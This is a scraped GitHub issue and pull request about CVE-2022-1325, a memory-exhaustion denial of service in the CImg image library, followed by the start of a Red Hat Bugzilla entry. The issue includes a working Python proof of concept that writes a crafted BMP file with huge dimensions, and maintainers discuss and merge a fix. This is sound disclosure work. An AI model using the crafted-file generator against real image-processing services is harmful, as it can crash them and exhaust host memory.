    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGreycLab%2FCImg%2Fissues%2F343)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=GreycLab%2FCImg)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[GreycLab](/GreycLab)
/
**[CImg](/GreycLab/CImg)**
Public

* [Notifications](/login?return_to=%2FGreycLab%2FCImg) You must be signed in to change notification settings
* [Fork
  286](/login?return_to=%2FGreycLab%2FCImg)
* [Star
   1.5k](/login?return_to=%2FGreycLab%2FCImg)

* [Code](/GreycLab/CImg)
* [Issues
  84](/GreycLab/CImg/issues)
* [Pull requests
  0](/GreycLab/CImg/pulls)
* [Actions](/GreycLab/CImg/actions)
* [Projects
  0](/GreycLab/CImg/projects)
* [Wiki](/GreycLab/CImg/wiki)
* [Security](/GreycLab/CImg/security)
* [Insights](/GreycLab/CImg/pulse)

Additional navigation options

* [Code](/GreycLab/CImg)
* [Issues](/GreycLab/CImg/issues)
* [Pull requests](/GreycLab/CImg/pulls)
* [Actions](/GreycLab/CImg/actions)
* [Projects](/GreycLab/CImg/projects)
* [Wiki](/GreycLab/CImg/wiki)
* [Security](/GreycLab/CImg/security)
* [Insights](/GreycLab/CImg/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FGreycLab%2FCImg%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FGreycLab%2FCImg%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Denial of service via RAM exhaustion in \_load\_bmp #343

Closed

[7unn3l](/7unn3l) opened this issue
Apr 2, 2022
¬∑ 18 comments

Closed

# [Denial of service via RAM exhaustion in \_load\_bmp](#top) #343

[7unn3l](/7unn3l) opened this issue
Apr 2, 2022
¬∑ 18 comments

## Comments

[![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=80&u=4030ff7b2b14b56b334d84213535464d6c7ce533&v=4)](/7unn3l)

Copy link

### **[7unn3l](/7unn3l)** commented [Apr 2, 2022](#issue-1190640729) ‚Ä¢ edited Loading

| Description Via a maliciously crafted pandore or bmp file with modified dx and dy header field values it is possible to trick the application into allocating huge buffer sizes like 64 Gigabyte upon reading the file from disk or from a virtual buffer. Version This does affect the newest Version of Cimg which is 3.10, commit [607aea7](https://github.com/GreycLab/CImg/commit/607aea7c89fd66470e58a77b126584132d9af8f8) as the time of writing. Proof of Concept Due to the fact that I cannot attach bmp files in this format, here is a small python script that will generate a bmp file with given dimmensions. Note that the final buffer size is calculated by multiplying the product of width and height by 3. This code snippet uses a sample value of 5 GB.  ``` import struct  def write_size(dx,dy):     x = struct.pack('I',dx)     y = struct.pack('I',dy)          min_bmp_head = list(                b'BM\xf2Y\x03\x00\x00\x00\x00\x006\x04\x00\x00(\x00\x00\x00 \                V\xa8\xab1\x02\x00\x00\x00\x01\x00\x08\x00\x00\x00\x00\x00 \                \xbcU\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00 \                \x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x01\x01\x00\x03\x03'                         )      min_bmp_head[0x12] = x[0]     min_bmp_head[0x13] = x[1]     min_bmp_head[0x14] = x[2]     min_bmp_head[0x15] = x[3]      min_bmp_head[0x16] = y[0]     min_bmp_head[0x17] = y[1]     min_bmp_head[0x18] = y[2]     min_bmp_head[0x19] = y[3]      open('crash.bmp','wb').write(bytes(min_bmp_head))  write_size(833333334,2) # use these two parameters to control dx and dy of the image. 833333334,2 for 5 GB  ```  then read the file via standard methods:  ``` #define cimg_display 0 #include "CImg.h" #include <iostream>  int main(int argc,const char* argv[]){      if (argc < 2){         printf("no img\n");         exit(1);     }      cimg_library::CImg<unsigned char> img;     img.assign(argv[1]); }  ```  The code was compiled with g++ version 9.4.0 on Ubuntu 9.4.0-1ubuntu1~20.04 via `g++ test.cpp -o ./test -ljpeg -lpng` Root cause *line numbers refer to main branch with commit [927fee5](https://github.com/GreycLab/CImg/commit/927fee511fe4fcc1ae5cdf2365a60048fe4ff935)*  altough safe\_size (line 11771) does check for overflows of the size\_t type, it does allow very large values . One would think that the try/catch block `try { _data = new T[siz]; }` (line 11885) does not allow for allocations that are too big and would completely circumvent this attack but actually, allocations that are equal to the maximum available RAM of a system or even numbers that are a bit higher (I tested the 5 GB case on a 4GB RAM machine) will *not* thorw an exception like std::bad\_alloc. Impact This vulnerability allows an attacker who can send images to an application to force an premature process exit and exhaust system memory, potentially leading to a full system denial of service. Prevention One could define a global constant that regulates the maximum value safe\_size can return. The user then could change the default value depending on context. |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=80&u=4030ff7b2b14b56b334d84213535464d6c7ce533&v=4)](/7unn3l)

Copy link

Author

### **[7unn3l](/7unn3l)** commented [Apr 6, 2022](#issuecomment-1090382561)

| update: apparently the same type of bug also affects .pandore files |
| --- |

All reactions

Sorry, something went wrong.

[![@dtschump](https://avatars.githubusercontent.com/u/10114565?s=80&u=fbdc65fa0cd1746697014bb7a10a7052cc63f081&v=4)](/dtschump)

Copy link

Collaborator

### **[dtschump](/dtschump)** commented [Apr 7, 2022](#issuecomment-1091459233)

| Thanks. I will investigate. For now, I've just run your Python code, this generated a very small `.bmp` file `crash.bmp` of size 746 bytes. When I try reading it with CImg (3.1.0\_pre), the bmp format is not recognized:  ``` [CImg] *** CImgIOException *** [instance(0,0,0,0,(nil),non-shared)] CImg<float>::load(): Failed to recognize format of file 'crash.bmp'.  ```  I suppose this is not expected? |
| --- |

All reactions

Sorry, something went wrong.

[![@dtschump](https://avatars.githubusercontent.com/u/10114565?s=80&u=fbdc65fa0cd1746697014bb7a10a7052cc63f081&v=4)](/dtschump)

Copy link

Collaborator

### **[dtschump](/dtschump)** commented [Apr 7, 2022](#issuecomment-1091506729)

| OK, was using Python 2.7 (the one by default). With Python3, the generated file is in binary mode and reproduce the bug. |
| --- |

All reactions

Sorry, something went wrong.

[![@dtschump](https://avatars.githubusercontent.com/u/10114565?s=80&u=fbdc65fa0cd1746697014bb7a10a7052cc63f081&v=4)](/dtschump)

Copy link

Collaborator

### **[dtschump](/dtschump)** commented [Apr 7, 2022](#issuecomment-1091530737)

| Hum, still not look like a .bmp file anyway (112 bytes):  ``` $ file crash.bmp  crash.bmp: data  ``` |
| --- |

All reactions

Sorry, something went wrong.

[![@dtschump](https://avatars.githubusercontent.com/u/10114565?s=80&u=fbdc65fa0cd1746697014bb7a10a7052cc63f081&v=4)](/dtschump)

Copy link

Collaborator

### **[dtschump](/dtschump)** commented [Apr 7, 2022](#issuecomment-1091562304)

| Anyway, I've added some code to check the validity of files. It should help: [619cb58](https://github.com/GreycLab/CImg/commit/619cb58dd90b4e03ac68286c70ed98acbefd1c90) |
| --- |

All reactions

Sorry, something went wrong.

[![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=80&u=4030ff7b2b14b56b334d84213535464d6c7ce533&v=4)](/7unn3l)

Copy link

Author

### **[7unn3l](/7unn3l)** commented [Apr 7, 2022](#issuecomment-1091654711) ‚Ä¢ edited Loading

| Hello,  Thanks for responding. Regarding the question if crash.bmp is still valid: I get:  ``` user@lnx:/mnt/c/Users/user/Desktop/cimg_fuzz_prod_finds/bmp_RAM_exhaustion$ uname -a Linux lnx 5.10.16.3-microsoft-standard-WSL2 #1 SMP Fri Apr 2 22:23:49 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux  user@lnx:/mnt/c/Users/user/Desktop/cimg_fuzz_prod_finds/bmp_RAM_exhaustion$ file -v file-5.41 magic file from /etc/magic:/usr/share/misc/magic  user@lnx:/mnt/c/Users/user/Desktop/cimg_fuzz_prod_finds/bmp_RAM_exhaustion$ python3 ./test.py  user@lnx:/mnt/c/Users/user/Desktop/cimg_fuzz_prod_finds/bmp_RAM_exhaustion$ file crash.bmp crash.bmp: PC bitmap, Windows 3.x format, 833333334 x 2 x 8224, 538976288 compression, image size 833333334, resolution 2 x 524289 px/m, 538976288 important colors, cbSize 219634, bits offset 1078  ```  so on my system, it still shows up as a valid bmp file |
| --- |

All reactions

Sorry, something went wrong.

[![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=80&u=4030ff7b2b14b56b334d84213535464d6c7ce533&v=4)](/7unn3l)

Copy link

Author

### **[7unn3l](/7unn3l)** commented [Apr 7, 2022](#issuecomment-1091666995)

| Regarding [619cb58](https://github.com/GreycLab/CImg/commit/619cb58dd90b4e03ac68286c70ed98acbefd1c90), I think this wont work when reading a virtual file buffer (`FILE*`). Because of `cimg::type<ulongT>::max()`, the maximum size ist a very large number (18446744073709551615 on my system), allowing for the same bug to occur again.  When reading the file from disk, the check seems fine to me. It is notable however, that with a large file, one would still be able to cause a big memory allocation but this is not as critical since sending e.g a 4 GB file to an application would probably be prohibted by other sources |
| --- |

All reactions

Sorry, something went wrong.

[![@dtschump](https://avatars.githubusercontent.com/u/10114565?s=80&u=fbdc65fa0cd1746697014bb7a10a7052cc63f081&v=4)](/dtschump)

Copy link

Collaborator

### **[dtschump](/dtschump)** commented [Apr 7, 2022](#issuecomment-1091670457)

| I think this wont work when reading a virtual file buffer (FILE\*)  Indeed, but in this case, as the data are read byte by byte, there is not much we can do, because there is actually no way of knowing the amount of data that will be passed through the `(FILE*)`, so we have to "trust" what is put inside. I could of course add a "limit" in this case (setting `fsiz` to some smaller value), but this would mean that valid image data larger than that could not be read, which is really annoying. |
| --- |

All reactions

Sorry, something went wrong.

[![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=80&u=4030ff7b2b14b56b334d84213535464d6c7ce533&v=4)](/7unn3l)

Copy link

Author

### **[7unn3l](/7unn3l)** commented [Apr 7, 2022](#issuecomment-1091722017)

| Ah thanks, I see the problem here. How about making the limit user controllable? It could have an initial value and then be user stettable. Im thinking of something like `cimg_libraray::MAX_PX_SIZE` . This would help developers when the application needs to parse user controlled streams and rescources are limited. |
| --- |

All reactions

Sorry, something went wrong.

[![@dtschump](https://avatars.githubusercontent.com/u/10114565?s=80&u=fbdc65fa0cd1746697014bb7a10a7052cc63f081&v=4)](/dtschump)

Copy link

Collaborator

### **[dtschump](/dtschump)** commented [Apr 7, 2022](#issuecomment-1091753659)

| So, [193abd7](https://github.com/GreycLab/CImg/commit/193abd7b29f3686840a48702d26aa3bf29deac3e) is a start :) |
| --- |

All reactions

Sorry, something went wrong.

[![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=80&u=4030ff7b2b14b56b334d84213535464d6c7ce533&v=4)](/7unn3l)

Copy link

Author

### **[7unn3l](/7unn3l)** commented [Apr 7, 2022](#issuecomment-1091813665)

| I agree! ^^  Now I wonder if this limit should also be used in other places, but at the moment I dont have time to investigate. Maybe one could integrate this check into `safe_size` but I guess this is a topic for another issue.  I will quickly verify if [193abd7](https://github.com/GreycLab/CImg/commit/193abd7b29f3686840a48702d26aa3bf29deac3e) fixes the crash on my machine... |
| --- |

All reactions

Sorry, something went wrong.

[![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=80&u=4030ff7b2b14b56b334d84213535464d6c7ce533&v=4)](/7unn3l)

Copy link

Author

### **[7unn3l](/7unn3l)** commented [Apr 7, 2022](#issuecomment-1091891849) ‚Ä¢ edited Loading

| okay so the old crashing images do not crash anymore üëç However, I have found another pandore sample, that also crashes wih RAM exhaustion and seems to get around the checks. I will investigate in the near future and report as soon as I have found the root cause. For bmp files however it looks fixed so far :D |
| --- |

All reactions

Sorry, something went wrong.

[![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=80&u=4030ff7b2b14b56b334d84213535464d6c7ce533&v=4)](/7unn3l)

Copy link

Author

### **[7unn3l](/7unn3l)** commented [Apr 11, 2022](#issuecomment-1095254570)

| Hello again,  The statement that I've made about pandore files is wrong. It was a mistake on my end.  **The fix seems to prevent RAM exhaustion in both filetypes** ‚úîÔ∏è  Thank you for your time and dedication :) |
| --- |

All reactions

Sorry, something went wrong.

[![@JamieSlome](https://avatars.githubusercontent.com/u/55323451?s=80&u=c125f829f1fd011e9c564e82e3fb87ad98d7e0a4&v=4)](/JamieSlome)

Copy link

### **[JamieSlome](/JamieSlome)** commented [Apr 14, 2022](#issuecomment-1099293777)

| Just attaching the initial report for reference:  <https://huntr.dev/bounties/a5e4fc45-8f14-4dd1-811b-740fc50c95d2/> |
| --- |

All reactions

Sorry, something went wrong.

[![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=80&u=4030ff7b2b14b56b334d84213535464d6c7ce533&v=4)](/7unn3l)

Copy link

Author

### **[7unn3l](/7unn3l)** commented [Apr 25, 2022](#issuecomment-1108924906) ‚Ä¢ edited Loading

| Hello, there is a small update: I've been investigating the loading process a bit more and actually found a bypass for the proposed fix. It has to do with buffers that are allocated without size checking through cimg\_max\_file\_size when loading image files via \_load\_XX. In this instance, I've found the bypass again in the bmp loading process but since this is a general problem (and I am certain that this problem will also occur in other parts of the lib), Ive made a pull request [#348](https://github.com/GreycLab/CImg/pull/348) to address it.  Ive fuzzed the image loading process of ascii,analyze,inr,pnm,bmp,pandore,dlm and pfm files and not found a single RAM exhaustion with this new change :)  Edit: I see that it is merged already. Thanks! |
| --- |

All reactions

Sorry, something went wrong.

[![@JamieSlome](https://avatars.githubusercontent.com/u/55323451?s=80&u=c125f829f1fd011e9c564e82e3fb87ad98d7e0a4&v=4)](/JamieSlome)

Copy link

### **[JamieSlome](/JamieSlome)** commented [Apr 26, 2022](#issuecomment-1109656310)

| [@7unn3l](https://github.com/7unn3l) - thanks for the heads up. I have added a comment to the report for reference. |
| --- |

All reactions

Sorry, something went wrong.

[![@tillea](https://avatars.githubusercontent.com/u/9447939?s=80&u=f52caaf368a5c3243fd0b3287d5ad21e88f5deef&v=4)](/tillea)

Copy link

### **[tillea](/tillea)** commented [Sep 27, 2022](#issuecomment-1259047400)

| Hi, this is just a gentle ping on this issue. Any news about a fix? |
| --- |

All reactions

Sorry, something went wrong.

[![@dtschump](https://avatars.githubusercontent.com/u/10114565?s=80&u=fbdc65fa0cd1746697014bb7a10a7052cc63f081&v=4)](/dtschump)

Copy link

Collaborator

### **[dtschump](/dtschump)** commented [Sep 27, 2022](#issuecomment-1259136029)

| To me, it has been fixed already. See <https://huntr.dev/bounties/a5e4fc45-8f14-4dd1-811b-740fc50c95d2/> |
| --- |

All reactions

Sorry, something went wrong.

[![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=40&u=4030ff7b2b14b56b334d84213535464d6c7ce533&v=4)](/7unn3l)
[7unn3l](/7unn3l)
closed this as [completed](/GreycLab/CImg/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Sep 27, 2022](#event-7466409700)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2FGreycLab%2FCImg%2Fissues%2F343)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

4 participants

[![@tillea](https://avatars.githubusercontent.com/u/9447939?s=52&v=4)](/tillea) [![@dtschump](https://avatars.githubusercontent.com/u/10114565?s=52&v=4)](/dtschump) [![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=52&v=4)](/7unn3l) [![@JamieSlome](https://avatars.githubusercontent.com/u/55323451?s=52&v=4)](/JamieSlome)

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_299cca70_20250114_201601.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGreycLab%2FCImg%2Fpull%2F348)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGreycLab%2FCImg%2Fpull%2F348)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=GreycLab%2FCImg)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[GreycLab](/GreycLab)
/
**[CImg](/GreycLab/CImg)**
Public

* [Notifications](/login?return_to=%2FGreycLab%2FCImg) You must be signed in to change notification settings
* [Fork
  286](/login?return_to=%2FGreycLab%2FCImg)
* [Star
   1.5k](/login?return_to=%2FGreycLab%2FCImg)

* [Code](/GreycLab/CImg)
* [Issues
  84](/GreycLab/CImg/issues)
* [Pull requests
  0](/GreycLab/CImg/pulls)
* [Actions](/GreycLab/CImg/actions)
* [Projects
  0](/GreycLab/CImg/projects)
* [Wiki](/GreycLab/CImg/wiki)
* [Security](/GreycLab/CImg/security)
* [Insights](/GreycLab/CImg/pulse)

Additional navigation options

* [Code](/GreycLab/CImg)
* [Issues](/GreycLab/CImg/issues)
* [Pull requests](/GreycLab/CImg/pulls)
* [Actions](/GreycLab/CImg/actions)
* [Projects](/GreycLab/CImg/projects)
* [Wiki](/GreycLab/CImg/wiki)
* [Security](/GreycLab/CImg/security)
* [Insights](/GreycLab/CImg/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FGreycLab%2FCImg%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FGreycLab%2FCImg%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# add global hardening against RAM exhaustions in safe\_size #348

 Merged

[dtschump](/dtschump)
merged 1 commit into
[GreycLab:master](/GreycLab/CImg/tree/master "GreycLab/CImg:master")
from
7unn3l:master

Apr 25, 2022

 Merged

# [add global hardening against RAM exhaustions in safe\_size](#top) #348

[dtschump](/dtschump)
merged 1 commit into
[GreycLab:master](/GreycLab/CImg/tree/master "GreycLab/CImg:master")
from
7unn3l:master

Apr 25, 2022

[Conversation
0](/GreycLab/CImg/pull/348)
[Commits
1](/GreycLab/CImg/pull/348/commits)
[Checks
0](/GreycLab/CImg/pull/348/checks)
[Files changed](/GreycLab/CImg/pull/348/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![7unn3l](https://avatars.githubusercontent.com/u/32908487?s=60&v=4)](/7unn3l)

Copy link

### @7unn3l **[7unn3l](/7unn3l)** commented [Apr 25, 2022](#issue-1214867491)

This pull request seeks to harden CImg against RAM exhaustions. `cimg_max_file_size` has been renamend to `cimg_max_buf_size` and a check was implemented inside `safe_size` to prevent sizes that are too large. This gives the user of the lib more control over possible resource consumption. Everywhere `safe_size` is used, cimg now checks if this size is within the user specified limits.

Sorry, something went wrong.

All reactions

`[add global hardening against RAM exhaustions in safe_size](/GreycLab/CImg/pull/348/commits/37cf0c1e5eeafb5b759c1a36423eb3dae27dbee8 "add global hardening against RAM exhaustions in safe_size")`

`[37cf0c1](/GreycLab/CImg/pull/348/commits/37cf0c1e5eeafb5b759c1a36423eb3dae27dbee8)`

[![@dtschump](https://avatars.githubusercontent.com/u/10114565?s=40&u=fbdc65fa0cd1746697014bb7a10a7052cc63f081&v=4)](/dtschump)
[dtschump](/dtschump)
merged commit [`5801be3`](/GreycLab/CImg/commit/5801be3d268c93e724b1395019463d86e660e04b)
into
GreycLab:master

[Apr 25, 2022](https://github.com/GreycLab/CImg/pull/348#event-6492648545)

[![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=40&u=4030ff7b2b14b56b334d84213535464d6c7ce533&v=4)](/7unn3l)
[7unn3l](/7unn3l)
mentioned this pull request
[Apr 25, 2022](#ref-issue-1190640729)

[Denial of service via RAM exhaustion in \_load\_bmp
#343](/GreycLab/CImg/issues/343)

Closed

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2FGreycLab%2FCImg%2Fpull%2F348)

Reviewers

No reviews

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

2 participants

[![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=52&v=4)](/7unn3l) [![@dtschump](https://avatars.githubusercontent.com/u/10114565?s=52&v=4)](/dtschump)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from bugzilla.redhat.com_dd4060be_20250114_201555.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D2074549)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D2074549)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D2074549)+ Login using a Red Hat Bugzilla account
  + Forgot¬†Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla ‚Äì Bug¬†2074549

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug¬†2074549**](show_bug.cgi?id=2074549)
(CVE-2022-1325)
- [CVE-2022-1325](https://access.redhat.com/security/cve/CVE-2022-1325) CImg: Denial of service via RAM exhaustion in \_load\_bmp

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2022-1325 CImg: Denial of service via RAM exhaustion in \_load\_bmp

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED UPSTREAM | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2022-1325 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | 